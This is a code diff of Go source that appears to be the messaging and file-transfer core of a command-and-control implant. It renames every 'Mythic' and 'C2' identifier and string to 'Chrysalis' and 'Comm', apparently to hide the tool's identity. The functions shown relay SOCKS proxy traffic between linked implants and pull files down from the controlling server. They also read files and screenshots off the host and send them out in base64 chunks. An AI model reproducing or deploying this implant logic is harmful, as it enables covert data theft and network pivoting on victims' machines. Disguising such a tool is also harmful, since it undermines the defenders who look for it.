@@ -26,35 +26,35 @@ import (
 )
 
 var (
-	// UUID is a per-payload identifier assigned by Mythic during creation
+	// UUID is a per-payload identifier assigned by Chrysalis during creation
 	UUID                  string = "8fb04272-d2df-44fd-bd49-87e907174c27"
-	MythicID                     = ""
+	ChrysalisID                  = ""
 	SeededRand                   = rand.New(rand.NewSource(time.Now().UnixNano()))
 	TaskResponses         []json.RawMessage
 	DelegateResponses     []structs.DelegateMessage
 	P2PConnectionMessages []structs.P2PConnectionMessage
 	// channel to process normal messages from P2P connection
-	HandleInboundMythicMessageFromEgressP2PChannel = make(chan structs.MythicMessageResponse, 10)
-	HandleMythicMessageToEgressFromP2PChannel      = make(chan bool)
+	HandleInboundChrysalisMessageFromEgressP2PChannel = make(chan structs.ChrysalisMessageResponse, 10)
+	HandleChrysalisMessageToEgressFromP2PChannel      = make(chan bool)
 	// channels to add/remove TCP connections connection
 	AddNewInternalTCPConnectionChannel = make(chan net.Conn, 1)
 	RemoveInternalTCPConnectionChannel = make(chan string, 1)
 	InternalTCPConnections             = make(map[string]net.Conn)
 	UUIDMappings                       = make(map[string]string)
 	mu                                 sync.Mutex
-	// process SOCKSv5 Messages from Mythic
-	FromMythicSocksChannel = make(chan structs.SocksMsg, 100)
+	// process SOCKSv5 Messages from Chrysalis
+	FromChrysalisSocksChannel = make(chan structs.SocksMsg, 100)
 
-	// send SOCKSv5 Messages to Mythic
-	ToMythicSocksChannel = make(chan structs.SocksMsg, 100)
+	// send SOCKSv5 Messages to Chrysalis
+	ToChrysalisSocksChannel = make(chan structs.SocksMsg, 100)
 )
 
-func GetMythicID() string {
-	return MythicID
+func GetChrysalisID() string {
+	return ChrysalisID
 }
 
-func SetMythicID(newMythicID string) {
-	MythicID = newMythicID
+func SetChrysalisID(newChrysalisID string) {
+	ChrysalisID = newChrysalisID
 }
 
 func GenerateSessionID() string {
@@ -66,13 +66,13 @@ func GenerateSessionID() string {
 	return string(b)
 }
 
-func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.SocksMsg {
+func getSocksChannelData(toChrysalisSocksChannel chan structs.SocksMsg) []structs.SocksMsg {
 	var data = make([]structs.SocksMsg, 0)
-	//fmt.Printf("***+ checking for data from toMythicSocksChannel\n")
+	//fmt.Printf("***+ checking for data from toChrysalisSocksChannel\n")
 	for {
 		select {
 
-		case msg, ok := <-toMythicSocksChannel:
+		case msg, ok := <-toChrysalisSocksChannel:
 			if ok {
 				//fmt.Printf("Channel %d was read for post_response with length %d.\n", msg.ServerId, len(msg.Data))
 				data = append(data, msg)
@@ -88,12 +88,12 @@ func getSocksChannelData(toMythicSocksChannel chan structs.SocksMsg) []structs.S
 }
 
 // gather profiles.TaskResponses, profiles.DelegateResponses, and getSocksChannelData into a post_response message
-func CreateMythicMessage() *structs.MythicMessage {
-	responseMsg := structs.MythicMessage{}
+func CreateChrysalisMessage() *structs.ChrysalisMessage {
+	responseMsg := structs.ChrysalisMessage{}
 	responseMsg.Action = "get_tasking"
 	responseMsg.TaskingSize = -1
 	responseMsg.GetDelegateTasks = true
-	SocksArray := getSocksChannelData(ToMythicSocksChannel)
+	SocksArray := getSocksChannelData(ToChrysalisSocksChannel)
 	if len(TaskResponses) > 0 || len(DelegateResponses) > 0 || len(P2PConnectionMessages) > 0 {
 		ResponseArray := make([]json.RawMessage, 0)
 		DelegateArray := make([]structs.DelegateMessage, 0)
@@ -208,12 +208,12 @@ func HandleDelegateMessageForInternalTCPConnections(delegates []structs.Delegate
 		//fmt.Printf("HTTP's HandleInternalDelegateMessages going to linked node: %v\n", delegates[i])
 		// check to see if this message goes to something we know about
 		if conn, ok := InternalTCPConnections[delegates[i].UUID]; ok {
-			if delegates[i].MythicUUID != "" {
-				// Mythic told us that our UUID was fake and gave the right one
-				InternalTCPConnections[delegates[i].MythicUUID] = conn
+			if delegates[i].ChrysalisUUID != "" {
+				// Chrysalis told us that our UUID was fake and gave the right one
+				InternalTCPConnections[delegates[i].ChrysalisUUID] = conn
 				// remove our old one
 				delete(InternalTCPConnections, delegates[i].UUID)
-				UUIDMappings[delegates[i].UUID] = delegates[i].MythicUUID
+				UUIDMappings[delegates[i].UUID] = delegates[i].ChrysalisUUID
 			}
 			//fmt.Printf("HTTP's sending data: ")
 			err := SendTCPData([]byte(delegates[i].Message), conn)
@@ -232,73 +232,73 @@ func printInternalTCPConnectionMap() {
 	fmt.Printf("---- done -----\n")
 }
 
-// SendFileChunks - Helper function to deal with sending files from agent to Mythic
-func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
+// SendFileChunks - Helper function to deal with sending files from agent to Chrysalis
+func SendFile(sendFileToChrysalis structs.SendFileToChrysalisStruct) {
 	var size int64
-	if sendFileToMythic.Data == nil {
-		if sendFileToMythic.File == nil {
+	if sendFileToChrysalis.Data == nil {
+		if sendFileToChrysalis.File == nil {
 			errResponse := structs.Response{}
 			errResponse.Completed = true
-			errResponse.TaskID = sendFileToMythic.Task.TaskID
-			errResponse.UserOutput = fmt.Sprintf("No data and no file specified when trying to send a file to Mythic")
-			sendFileToMythic.Task.Job.SendResponses <- errResponse
-			sendFileToMythic.FinishedTransfer <- 1
+			errResponse.TaskID = sendFileToChrysalis.Task.TaskID
+			errResponse.UserOutput = fmt.Sprintf("No data and no file specified when trying to send a file to Chrysalis")
+			sendFileToChrysalis.Task.Job.SendResponses <- errResponse
+			sendFileToChrysalis.FinishedTransfer <- 1
 			return
 		} else {
-			fi, err := sendFileToMythic.File.Stat()
+			fi, err := sendFileToChrysalis.File.Stat()
 			if err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
+				errResponse.TaskID = sendFileToChrysalis.Task.TaskID
 				errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
+				sendFileToChrysalis.Task.Job.SendResponses <- errResponse
+				sendFileToChrysalis.FinishedTransfer <- 1
 				return
 			}
 			size = fi.Size()
 		}
 	} else {
-		size = int64(len(*sendFileToMythic.Data))
+		size = int64(len(*sendFileToChrysalis.Data))
 	}
 
-	const FILE_CHUNK_SIZE = 512000 //Normal mythic chunk size
+	const FILE_CHUNK_SIZE = 512000 //Normal chrysalis chunk size
 	chunks := uint64(math.Ceil(float64(size) / FILE_CHUNK_SIZE))
 	fileDownloadData := structs.FileDownloadMessage{}
 	fileDownloadData.TotalChunks = int(chunks)
-	abspath, err := filepath.Abs(sendFileToMythic.FullPath)
+	abspath, err := filepath.Abs(sendFileToChrysalis.FullPath)
 	if err != nil {
 		errResponse := structs.Response{}
 		errResponse.Completed = true
-		errResponse.TaskID = sendFileToMythic.Task.TaskID
+		errResponse.TaskID = sendFileToChrysalis.Task.TaskID
 		errResponse.UserOutput = fmt.Sprintf("Error getting full path to file: %s", err.Error())
-		sendFileToMythic.Task.Job.SendResponses <- errResponse
-		sendFileToMythic.FinishedTransfer <- 1
+		sendFileToChrysalis.Task.Job.SendResponses <- errResponse
+		sendFileToChrysalis.FinishedTransfer <- 1
 		return
 	}
 	fileDownloadData.FullPath = abspath
-	fileDownloadData.IsScreenshot = sendFileToMythic.IsScreenshot
+	fileDownloadData.IsScreenshot = sendFileToChrysalis.IsScreenshot
 	// create our normal response message and add our Download part to it
 	fileDownloadMsg := structs.Response{}
-	fileDownloadMsg.TaskID = sendFileToMythic.Task.TaskID
+	fileDownloadMsg.TaskID = sendFileToChrysalis.Task.TaskID
 	fileDownloadMsg.Download = &fileDownloadData
-	fileDownloadMsg.TrackingUUID = sendFileToMythic.TrackingUUID
-	// send the initial message to Mythic to announce we have a file to transfer
-	sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
+	fileDownloadMsg.TrackingUUID = sendFileToChrysalis.TrackingUUID
+	// send the initial message to Chrysalis to announce we have a file to transfer
+	sendFileToChrysalis.Task.Job.SendResponses <- fileDownloadMsg
 
 	var fileDetails map[string]interface{}
 
 	for {
 		// Wait for a response from the channel
-		resp := <-sendFileToMythic.FileTransferResponse
+		resp := <-sendFileToChrysalis.FileTransferResponse
 		err := json.Unmarshal(resp, &fileDetails)
 		//fmt.Printf("Got %v back from file download first response", fileDetails)
 		if err != nil {
 			errResponse := structs.Response{}
 			errResponse.Completed = true
-			errResponse.TaskID = sendFileToMythic.Task.TaskID
+			errResponse.TaskID = sendFileToChrysalis.Task.TaskID
 			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
-			sendFileToMythic.Task.Job.SendResponses <- errResponse
-			sendFileToMythic.FinishedTransfer <- 1
+			sendFileToChrysalis.Task.Job.SendResponses <- errResponse
+			sendFileToChrysalis.FinishedTransfer <- 1
 			return
 		}
 
@@ -306,9 +306,9 @@ func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 		if _, ok := fileDetails["file_id"]; ok {
 			if ok {
 				updateUserOutput := structs.Response{}
-				updateUserOutput.TaskID = sendFileToMythic.Task.TaskID
+				updateUserOutput.TaskID = sendFileToChrysalis.Task.TaskID
 				updateUserOutput.UserOutput = "{\"file_id\": \"" + fmt.Sprintf("%v", fileDetails["file_id"]) + "\", \"total_chunks\": \"" + strconv.Itoa(int(chunks)) + "\"}\n"
-				sendFileToMythic.Task.Job.SendResponses <- updateUserOutput
+				sendFileToChrysalis.Task.Job.SendResponses <- updateUserOutput
 				break
 			} else {
 				//log.Println("Didn't find response with file_id key")
@@ -317,43 +317,43 @@ func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 		}
 	}
 	var r *bytes.Buffer = nil
-	if sendFileToMythic.Data != nil {
-		r = bytes.NewBuffer(*sendFileToMythic.Data)
+	if sendFileToChrysalis.Data != nil {
+		r = bytes.NewBuffer(*sendFileToChrysalis.Data)
 	} else {
-		sendFileToMythic.File.Seek(0, 0)
+		sendFileToChrysalis.File.Seek(0, 0)
 	}
 	lastPercentCompleteNotified := 0
 	for i := uint64(0); i < chunks; {
-		if sendFileToMythic.Task.ShouldStop() {
+		if sendFileToChrysalis.Task.ShouldStop() {
 			// tasked to stop, so bail
-			sendFileToMythic.FinishedTransfer <- 1
+			sendFileToChrysalis.FinishedTransfer <- 1
 			return
 		}
-		time.Sleep(time.Duration(sendFileToMythic.Task.Job.C2.GetSleepTime()) * time.Second)
+		time.Sleep(time.Duration(sendFileToChrysalis.Task.Job.Comm.GetSleepTime()) * time.Second)
 		partSize := int(math.Min(FILE_CHUNK_SIZE, float64(int64(size)-int64(i*FILE_CHUNK_SIZE))))
 		partBuffer := make([]byte, partSize)
 		// Create a temporary buffer and read a chunk into that buffer from the file
-		if sendFileToMythic.Data != nil {
+		if sendFileToChrysalis.Data != nil {
 			_, err = r.Read(partBuffer)
 			if err != io.EOF && err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
+				errResponse.TaskID = sendFileToChrysalis.Task.TaskID
 				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
+				sendFileToChrysalis.Task.Job.SendResponses <- errResponse
+				sendFileToChrysalis.FinishedTransfer <- 1
 				return
 			}
 		} else {
-			sendFileToMythic.File.Seek(int64(i*FILE_CHUNK_SIZE), 1)
-			_, err = sendFileToMythic.File.Read(partBuffer)
+			sendFileToChrysalis.File.Seek(int64(i*FILE_CHUNK_SIZE), 1)
+			_, err = sendFileToChrysalis.File.Read(partBuffer)
 			if err != io.EOF && err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
+				errResponse.TaskID = sendFileToChrysalis.Task.TaskID
 				errResponse.UserOutput = fmt.Sprintf("\nError reading from file: %s\n", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
+				sendFileToChrysalis.Task.Job.SendResponses <- errResponse
+				sendFileToChrysalis.FinishedTransfer <- 1
 				return
 			}
 		}
@@ -364,29 +364,29 @@ func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 		fileDownloadData.FileID = fileDetails["file_id"].(string)
 		fileDownloadData.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
 		fileDownloadMsg.Download = &fileDownloadData
-		sendFileToMythic.Task.Job.SendResponses <- fileDownloadMsg
+		sendFileToChrysalis.Task.Job.SendResponses <- fileDownloadMsg
 		newPercentComplete := ((fileDownloadData.ChunkNum * 100) / int(chunks))
-		if newPercentComplete/10 > lastPercentCompleteNotified && sendFileToMythic.SendUserStatusUpdates {
+		if newPercentComplete/10 > lastPercentCompleteNotified && sendFileToChrysalis.SendUserStatusUpdates {
 			response := structs.Response{}
 			response.Completed = false
-			response.TaskID = sendFileToMythic.Task.TaskID
+			response.TaskID = sendFileToChrysalis.Task.TaskID
 			response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
-			sendFileToMythic.Task.Job.SendResponses <- response
+			sendFileToChrysalis.Task.Job.SendResponses <- response
 			lastPercentCompleteNotified = newPercentComplete / 10
 		}
 		// Wait for a response for our file chunk
 		var postResp map[string]interface{}
 		for {
-			decResp := <-sendFileToMythic.FileTransferResponse
+			decResp := <-sendFileToChrysalis.FileTransferResponse
 			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk
 
 			if err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
-				errResponse.TaskID = sendFileToMythic.Task.TaskID
+				errResponse.TaskID = sendFileToChrysalis.Task.TaskID
 				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
-				sendFileToMythic.Task.Job.SendResponses <- errResponse
-				sendFileToMythic.FinishedTransfer <- 1
+				sendFileToChrysalis.Task.Job.SendResponses <- errResponse
+				sendFileToChrysalis.FinishedTransfer <- 1
 				return
 			}
 			break
@@ -398,80 +398,80 @@ func SendFile(sendFileToMythic structs.SendFileToMythicStruct) {
 		}
 
 	}
-	sendFileToMythic.FinishedTransfer <- 1
+	sendFileToChrysalis.FinishedTransfer <- 1
 	return
 }
 
 // Get a file
-func GetFile(getFileFromMythic structs.GetFileFromMythicStruct) {
-	// when we're done fetching the file, send a 0 byte length byte array to the getFileFromMythic.ReceivedChunkChannel
+func GetFile(getFileFromChrysalis structs.GetFileFromChrysalisStruct) {
+	// when we're done fetching the file, send a 0 byte length byte array to the getFileFromChrysalis.ReceivedChunkChannel
 	fileUploadData := structs.FileUploadMessage{}
-	fileUploadData.FileID = getFileFromMythic.FileID
+	fileUploadData.FileID = getFileFromChrysalis.FileID
 	fileUploadData.ChunkSize = 512000
 	fileUploadData.ChunkNum = 1
-	fileUploadData.FullPath = getFileFromMythic.FullPath
+	fileUploadData.FullPath = getFileFromChrysalis.FullPath
 
 	fileUploadMsg := structs.Response{}
-	fileUploadMsg.TaskID = getFileFromMythic.Task.TaskID
+	fileUploadMsg.TaskID = getFileFromChrysalis.Task.TaskID
 	fileUploadMsg.Upload = &fileUploadData
-	fileUploadMsg.TrackingUUID = getFileFromMythic.TrackingUUID
+	fileUploadMsg.TrackingUUID = getFileFromChrysalis.TrackingUUID
 
-	getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
-	rawData := <-getFileFromMythic.FileTransferResponse
-	fileUploadMsgResponse := structs.FileUploadMessageResponse{} // Unmarshal the file upload response from mythic
+	getFileFromChrysalis.Task.Job.SendResponses <- fileUploadMsg
+	rawData := <-getFileFromChrysalis.FileTransferResponse
+	fileUploadMsgResponse := structs.FileUploadMessageResponse{} // Unmarshal the file upload response from chrysalis
 	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
 	if err != nil {
 		errResponse := structs.Response{}
 		errResponse.Completed = true
-		errResponse.TaskID = getFileFromMythic.Task.TaskID
-		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-		getFileFromMythic.Task.Job.SendResponses <- errResponse
-		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+		errResponse.TaskID = getFileFromChrysalis.Task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Chrysalis: %s", err.Error())
+		getFileFromChrysalis.Task.Job.SendResponses <- errResponse
+		getFileFromChrysalis.ReceivedChunkChannel <- make([]byte, 0)
 		return
 	}
 	// inform the user that we started getting data and let them know how many chunks it'll be
-	if getFileFromMythic.SendUserStatusUpdates {
+	if getFileFromChrysalis.SendUserStatusUpdates {
 		response := structs.Response{}
 		response.Completed = false
-		response.TaskID = getFileFromMythic.Task.TaskID
-		response.UserOutput = fmt.Sprintf("Fetching file from Mythic with %d total chunks at %d bytes per chunk\n", fileUploadMsgResponse.TotalChunks, fileUploadData.ChunkSize)
-		getFileFromMythic.Task.Job.SendResponses <- response
+		response.TaskID = getFileFromChrysalis.Task.TaskID
+		response.UserOutput = fmt.Sprintf("Fetching file from Chrysalis with %d total chunks at %d bytes per chunk\n", fileUploadMsgResponse.TotalChunks, fileUploadData.ChunkSize)
+		getFileFromChrysalis.Task.Job.SendResponses <- response
 	}
 	// start handling the data and sending it to the requesting task
 	decoded, err := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
 	if err != nil {
 		errResponse := structs.Response{}
 		errResponse.Completed = true
-		errResponse.TaskID = getFileFromMythic.Task.TaskID
-		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-		getFileFromMythic.Task.Job.SendResponses <- errResponse
-		getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+		errResponse.TaskID = getFileFromChrysalis.Task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Chrysalis: %s", err.Error())
+		getFileFromChrysalis.Task.Job.SendResponses <- errResponse
+		getFileFromChrysalis.ReceivedChunkChannel <- make([]byte, 0)
 		return
 	}
-	getFileFromMythic.ReceivedChunkChannel <- decoded
+	getFileFromChrysalis.ReceivedChunkChannel <- decoded
 	// track the percentage of completion for file transfer for users so it's easier to see
 	lastPercentCompleteNotified := 0
 	if fileUploadMsgResponse.TotalChunks > 1 {
 		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
-			if getFileFromMythic.Task.ShouldStop() {
-				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+			if getFileFromChrysalis.Task.ShouldStop() {
+				getFileFromChrysalis.ReceivedChunkChannel <- make([]byte, 0)
 				return
 			}
 			// update to the next chunk
 			fileUploadMsg.Upload.ChunkNum = index
 			// send the request
-			getFileFromMythic.Task.Job.SendResponses <- fileUploadMsg
+			getFileFromChrysalis.Task.Job.SendResponses <- fileUploadMsg
 			// get the response
-			rawData := <-getFileFromMythic.FileTransferResponse
+			rawData := <-getFileFromChrysalis.FileTransferResponse
 			fileUploadMsgResponse = structs.FileUploadMessageResponse{} // Unmarshal the file upload response from apfell
 			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
 			if err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
-				errResponse.TaskID = getFileFromMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-				getFileFromMythic.Task.Job.SendResponses <- errResponse
-				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+				errResponse.TaskID = getFileFromChrysalis.Task.TaskID
+				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Chrysalis: %s", err.Error())
+				getFileFromChrysalis.Task.Job.SendResponses <- errResponse
+				getFileFromChrysalis.ReceivedChunkChannel <- make([]byte, 0)
 				return
 			}
 			// Base64 decode the chunk data
@@ -479,23 +479,23 @@ func GetFile(getFileFromMythic structs.GetFileFromMythicStruct) {
 			if err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
-				errResponse.TaskID = getFileFromMythic.Task.TaskID
-				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Mythic: %s", err.Error())
-				getFileFromMythic.Task.Job.SendResponses <- errResponse
-				getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+				errResponse.TaskID = getFileFromChrysalis.Task.TaskID
+				errResponse.UserOutput = fmt.Sprintf("Failed to parse message response from Chrysalis: %s", err.Error())
+				getFileFromChrysalis.Task.Job.SendResponses <- errResponse
+				getFileFromChrysalis.ReceivedChunkChannel <- make([]byte, 0)
 				return
 			}
-			getFileFromMythic.ReceivedChunkChannel <- decoded
+			getFileFromChrysalis.ReceivedChunkChannel <- decoded
 			newPercentComplete := ((index * 100) / fileUploadMsgResponse.TotalChunks)
-			if newPercentComplete/10 > lastPercentCompleteNotified && getFileFromMythic.SendUserStatusUpdates {
+			if newPercentComplete/10 > lastPercentCompleteNotified && getFileFromChrysalis.SendUserStatusUpdates {
 				response := structs.Response{}
 				response.Completed = false
-				response.TaskID = getFileFromMythic.Task.TaskID
+				response.TaskID = getFileFromChrysalis.Task.TaskID
 				response.UserOutput = fmt.Sprintf("File Transfer Update: %d%% complete\n", newPercentComplete)
-				getFileFromMythic.Task.Job.SendResponses <- response
+				getFileFromChrysalis.Task.Job.SendResponses <- response
 				lastPercentCompleteNotified = newPercentComplete / 10
 			}
 		}
 	}
-	getFileFromMythic.ReceivedChunkChannel <- make([]byte, 0)
+	getFileFromChrysalis.ReceivedChunkChannel <- make([]byte, 0)
 }
